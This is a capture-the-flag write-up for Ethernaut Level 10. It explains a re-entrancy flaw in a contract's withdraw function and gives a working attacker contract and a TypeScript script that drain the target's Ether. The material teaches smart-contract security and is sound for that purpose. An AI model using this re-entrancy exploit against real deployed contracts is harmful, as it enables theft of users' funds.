# Solution for Ethernaut Level 10: Re-entrancy

## Goal

The goal of this level is to steal all the funds from the `Reentrance` contract.

## Vulnerability Analysis

The vulnerability lies in the `withdraw` function of the `Reentrance` contract. It sends Ether to the user _before_ updating their balance state.

```solidity
function withdraw(uint256 _amount) public {
  if (balances[msg.sender] >= _amount) {
    (bool result, ) = msg.sender.call{ value: _amount }("");
    if (result) {
      _amount;
    }
    balances[msg.sender] -= _amount;
  }
}
```

This violation of the Checks-Effects-Interactions pattern allows a malicious contract to re-enter the `withdraw` function. When `msg.sender.call` is executed, it triggers the `receive` or `fallback` function of the caller. If the caller is a contract, it can call `withdraw` again inside that function. Since `balances[msg.sender]` has not yet been decreased, the check `balances[msg.sender] >= _amount` passes again, allowing the attacker to withdraw more funds than they deposited.

## The Exploit

The `exploit.ts` script uses a malicious contract, `Reentrancy.sol`, to perform the attack.

### Step 1: The Malicious Contract (`Reentrancy.sol`)

We deploy a contract designed to exploit the re-entrancy vulnerability.

```solidity
contract Reentrancy {
  Reentrance public reentrance;
  bool public entered;

  constructor(Reentrance _reentrance) public {
    reentrance = _reentrance;
  }

  function exploit() public payable {
    // 1. Donate funds to establish a balance
    reentrance.donate{ value: msg.value }(address(this));
    // 2. Withdraw the funds to trigger the attack
    reentrance.withdraw(msg.value);
  }

  receive() external payable {
    // 3. Re-enter the withdraw function once
    if (!entered) {
      entered = true;
      reentrance.withdraw(msg.value);
    }
  }
}
```

The `receive` function includes a check `if (!entered)` to ensure we only re-enter once. This is calculated to drain the contract exactly: if we donate an amount equal to the contract's current balance, triggering `withdraw` twice (once normally, once via re-entrancy) will remove the total balance (original + donated).

### Step 2: Executing the Attack

The `exploit.ts` script orchestrates the attack:

1.  **Check Balance**: It retrieves the current balance of the target `Reentrance` contract.
2.  **Deploy Attacker**: It deploys the `Reentrancy` contract.
3.  **Execute Exploit**: It calls `reentrancy.exploit()` sending an amount of Ether equal to the target's current balance.

```typescript
const initialBalances = await rpc.getBalance(reentranceAddress);

// ... deploy Reentrancy ...

await (
  await reentrancy.exploit({
    value: initialBalances,
  })
).wait();
```

By sending `initialBalances`, the target contract's total balance becomes `2 * initialBalances`. The `exploit` function donates this amount and calls `withdraw`. The re-entrancy mechanism calls `withdraw` a second time. The total withdrawn amount is `2 * initialBalances`, effectively draining the contract.
